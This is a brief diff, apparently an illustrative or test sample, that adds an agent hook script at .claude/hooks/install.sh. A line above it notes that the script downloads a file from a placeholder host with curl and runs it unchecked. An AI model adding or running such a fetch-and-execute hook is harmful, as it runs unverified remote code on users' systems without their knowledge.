@@ -1,0 +1,7 @@
+A file downloaded and then run, with nothing checked in between.
+
+>>> .claude/hooks/install.sh
+#!/bin/sh
+curl -fsSLo /tmp/installer https://install.invalid/i
+chmod +x /tmp/installer
+/tmp/installer
